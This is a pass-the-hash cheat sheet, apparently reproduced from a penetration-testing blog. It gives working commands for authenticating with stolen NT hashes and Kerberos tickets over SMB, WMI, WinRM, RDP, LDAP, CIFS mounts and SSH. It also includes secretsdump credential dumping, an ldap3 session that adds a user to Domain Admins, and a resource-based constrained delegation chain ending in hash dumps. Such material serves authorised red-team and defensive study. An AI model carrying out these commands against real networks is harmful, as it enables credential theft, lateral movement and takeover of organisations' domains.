### Pass the Hash
source: https://www.n00py.io/2020/12/alternative-ways-to-pass-the-hash-pth/


#### Crackmap Exec


```
cme smb 10.0.0.20 -u user -H BD1C6503987F8FF006296118F359FA79  -d domain.local
```
#### Impacket - wmiexec.py
```
wmiexec.py domain.local/user@10.0.0.20 -hashes aad3b435b51404eeaad3b435b51404ee:BD1C6503987F8FF006296118F359FA79
```

#### WinRM

What: The short of it is that Windows Remote Management (WinRM) is another way to remotely manage computers aside from WMI and other similar protocols and uses a different set of ports.  WinRM uses either port 5985 (HTTP) or 5986 (HTTPS).

Why: Sometimes you will find that SMB is not open, or that some endpoint protection is preventing you from using your standard toolset.

```
evil-winrm.rb -i 10.0.0.20 -u user -H BD1C6503987F8FF006296118F359FA79
```

#### RDP

What: Remote desktop is a program or an operating system feature that allows a user to connect to a computer in another location, see that computer’s desktop and interact with it as if it were local.

Why: Often times during a penetration test you may want to access software installed on a user’s system that is only available through a graphic interface.  This may be a password manager that can be exported easily via the GUI, or other software that can perform actions that would be impossible/burdensome to use otherwise.  You may want to pass an NT hash of a user who couldn’t be cracked and take over their session.
```
cme smb 10.0.0.200 -u Administrator -H 8846F7EAEE8FB117AD06BDD830B7586C -x 'reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f'
```
Once the registry key is set, you can then pass the hash with xfreerdp:
```
xfreerdp /v:192.168.2.200 /u:Administrator /pth:8846F7EAEE8FB117AD06BDD830B7586C
```

#### smbclient

What: smbclient is an FTP-like client to interact with SMB/CIFS resources.

Why: Often times you may not have administrative access to a system, despite having recovered valid hashes.  Consider the following scenario: You compromised a single host and dumped hashes.  One of the hashes belongs to the head of Finance.  They do not have administrative access over infrastructure, but have access to troves of confidential data on the file server.

How: smbclient has a –pw-nt-hash flag that you can use to pass an NT Hash.

```
smbclient //10.0.0.30/Finance -U user --pw-nt-hash BD1C6503987F8FF006296118F359FA79 -W domain.local
```

#### LDAP

What: Active Directory is the Windows implementation of a general-purpose directory service, which uses LDAP as its primary access protocol.

Why: Often times I find the best Active Directory attack chains often involve exploiting ACLs.  Consider a common penetration testing scenario: You’ve gained access to a NT hash of a user in an IT admin group that has admin access over an exchange server.  You do not have admin access over domain controllers.  Exchange servers are a member of the Exchange Trusted Subsystem group, which is a member of Exchange Windows Permissions group. This group has WriteDACL access over the domain.  It’s also important to know that computer accounts have usernames and passwords, and that these passwords are effectively uncrackable, which is why passing the hash is extremely useful.

How:
First, recover the NT hash for the Exchange server.
```
secretsdump.py ituser@10.0.0.40 -hashes aad3b435b51404eeaad3b435b51404ee:BD1C6503987F8FF006296118F359FA79
```

Once you have the NT hash for the exchange server, you can authenticate to a domain controller using ldap3, and authenticate by passing the hash. From here you can do a lot, but a simple attack involves adding a user you control to the Domain Admins group. In this example you may of course also use the Exchange account to DCsync with secretsdump.py.  

In the case of compromising the NT hash of a member of the Account Operators group, you would not be able to DCsync however, you could use this method to add users to certain groups to expand access.


```
python3
>>> import ldap3
>>> user = 'DOMAIN\\EXCHANGE$'
>>> password = 'aad3b435b51404eeaad3b435b51404ee:6216d3268ba7634e92313c8b60293248'
>>> server = ldap3.Server('DOMAIN.LOCAL')
from ldap3 import Server, Connection, SIMPLE, SYNC, ALL, SASL, NTLM
connection = ldap3.Connection(server, user=user, password=password, authentication=NTLM)
>>> connection.bind()
>>> from ldap3.extend.microsoft.addMembersToGroups import ad_add_members_to_groups as addUsersInGroups
>>> user_dn = 'CN=IT User,OU=Standard Accounts,DC=domain,DC=local'
>>> group_dn = 'CN=Domain Admins,CN=Users,DC=domain,DC=local'
>>> addUsersInGroups(connection, user_dn, group_dn)
True
```

#### Pass the Ticket

What: Pass the ticket (PtT) is a method of authenticating to a system using Kerberos tickets without having access to an account’s password.

Why: It may not be possible to authenticate with NTLM, and only Kerberos authentication is allowed.  I won’t even attempt to explain how Kerberos works (I don’t quite get it honestly) but it can be very useful to understand how to use it in attacks.

How: The normal way to create a Kerberos ticket on Linux is by using kinit with the username, domain, and password.  If you don’t have the password, this is a problem.  Fortunately, impacket has a tool that allows you to use an NT Hash to acquire a valid Ticket Granting Ticket (TGT) from a domain controller.  Unfortunately however, Linux distros don’t typically have Kerberos tools installed on them and you will need to set them up.


    1 Install the kerberos package
    2 Configure the AD realm
    3 Get DNS working properly
    4 Sync time

To create a Kerberos TGT using an NT hash, run a command like below:

```
python3 getTGT.py -hashes aad3b435b51404eeaad3b435b51404ee:B65039D1C0359FA797F88FF06296118F domain.local/user
```

You will want to copy the ticket to /tmp/krb5cc_0, as a lot of tools look for it in that location.  You also want to set the KRB5CCNAME environment variable to the ticket location, as some tools use that to find the ticket location.
```
cp user.ccache /tmp/krb5cc_0
export KRB5CCNAME=/tmp/krb5cc_0
```
You can validate the ticket using klist.

```
 klist
Credentials cache: FILE:/tmp/krb5cc_0
Principal: user@domain.local
```

Now that you have a ticket you can use it with all of the impacket tools as an alternative to providing a password or NT hash.  This will prove to be very useful in certain situations as you will see next.  Do note that whenever using Kerberos authentication you will want to use DNS names of targets instead of IP addresses.

#### Mount

What: On Linux a Windows share can be mounted on a particular mount point in the local directory tree using the cifs mount type within the mount tool.

Why: While we can pass the hash using smbclient, its FTP-like interface can be limiting.  It’s often much more useful to mount a share, that way you can interact with it via the Linux command line or via a GUI file explorer. For added user experience, you can even expose this mount point with SSHFS, so you can explore the share from the comfort of your local Windows or Mac file explorer.

How: When mounting a share you cannot pass the hash, but you can connect with a Kerberos ticket (Which you can get by passing the hash!). Use a command similar to below to mount a share.  If it fails wit the error “No such file or directory” It often means that your ticket isn’t where it expected it to be or the permissions do not allow mount to see it.

```
sudo mount -t cifs -o sec=krb5,vers=3.0 '//SERVER.DOMAIN.LOCAL/SHARE' /mnt/share
```

#### SSH

What: The SSH protocol (also referred to as Secure Shell) is a method for secure remote login from one computer to another.

Why: SSH is the standard way to log onto UNIX and Linux systems.  All of the exec methods for Windows are unavailable.  Typically the only real way to remotely access these systems is via this protocol.  In larger organizations, I’ve often found that the Linux systems are joined to Active Directory.  If you have a lost of domain groups, search them to see if there are any with unix/linux in the name.  This a good sign that UNIX/Linux systems may be domain joined.

How: You cannot pass the hash to SSH, but you can connect with a Kerberos ticket (Which you can get by passing the hash!). 

First, try connecting using SSH and enable verbose messages.

```
ssh -o GSSAPIAuthentication=yes user@domain.local -vv
debug1: Authentications that can continue: publickey,gssapi-keyex,gssapi-with-mic,password
debug1: Next authentication method: gssapi-with-mic
debug1: Unspecified GSS failure.  Minor code may provide more information
No Kerberos credentials available (default cache: FILE:/tmp/krb5cc_1045)
```
Likely you will see that it is expecting the krb5 ticket somewhere else (depends on your UID) so move your ticket there instead.
```
cp user.ccache /tmp/krb5cc_1045
```
Once you have your ticket in the right spot, try to connect again.  If it doesn’t work, also consider using -l to specify the username.
```
ssh -o GSSAPIAuthentication=yes user@domain.local
```

#### Resource Based Constrained Delegation (RBCD)

What: If you have write privileges (WriteDACL, GenericWrite, GenericAll, etc) over a computer object, it is possible to gain elevated command execution on it.  This is not a new way to pass the hash beyond what is previously mentioned, but this attack chain incorporates multiple PTH techniques such as PTH via SMB, PTH to LDAP, PTH to get a kerberos ticket, and finally pass the ticket.

In this example we are assuming one computer object has write access over another computer object.

Why: Often times I find that there are no simple attack paths in an environment, and Active Directory privilege escalation requires exploiting ACL based attacks.

How: First, pass the hash of a user with administrative access to the first computer to recover that computers NT hash.
```
secretsdump.py ituser@PC01.domain.local -hashes aad3b435b51404eeaad3b435b51404ee:BD1C6503987F8FF006296118F359FA79
```

Second, use the rbcd_permissions script to pass the hash of the computer account to the domain controller via LDAP to update the msDS-AllowedToActOnBehalfOfOtherIdentity property for the second computer.  This will allow the first computer to impersonate any domain user on that system.
```
python3 rbcd.py -u PC01$ -H aad3b435b51404eeaad3b435b51404ee:6216d3268ba7634e92313c8b60293248 -t 'CN=PC02,CN=Computers,DC=domain,DC=local' -d domain.local -c 'CN=PC01,CN=Computers,DC=domain,DC=local'  -l DC1.domain.local

```
Use the getST.py script from impacket to create a service ticket for an administrative user on the second computer, using the hash of the first computer.
```
getST.py -spn cifs/PC02 -hashes aad3b435b51404eeaad3b435b51404ee:6216d3268ba7634e92313c8b60293248 -impersonate DA domain.local/PC01\$ 
```

Once the ticket is created, pass the ticket to the second computer to gain administrative access over it.  Dump hashes, pop a shell, or do whatever you need to do on that system.
```
secretsdump.py -k PC02.domain.local
```
